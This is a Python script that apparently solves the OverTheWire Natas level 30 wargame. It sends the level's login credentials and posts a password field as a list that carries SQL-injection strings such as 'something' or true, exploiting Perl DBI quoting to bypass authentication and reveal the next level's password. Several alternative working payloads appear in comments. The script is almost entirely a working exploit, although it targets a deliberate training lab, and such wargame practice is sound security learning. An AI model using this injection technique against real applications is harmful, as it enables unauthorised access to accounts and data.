import requests
import re

# Credentials for natas30
username = "natas30"
password = "WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH"

# Target URL
url = "http://natas30.natas.labs.overthewire.org"


# Start a session to persist cookies and headers across requests
session = requests.Session()

# our payload instead of string we inject list instead
payload = {
    "username":"natas31",
    "password":["'something' or true",2]
}

### other payload that also worked
# ["'anything' or 1=1",3] 
# ["false or true",4]
# ["'pass' or 1=1",5]

response = session.post(
    url,
    data=payload,
    auth=(username, password)
)

print(response.text)

#interesting read
#https://security.stackexchange.com/questions/175703/is-this-perl-database-connection-vulnerable-to-sql-injection
#https://www.nntp.perl.org/group/perl.dbi.dev/2001/11/msg485.html
#https://www.oreilly.com/library/view/programming-the-perl/1565926994/re43.html

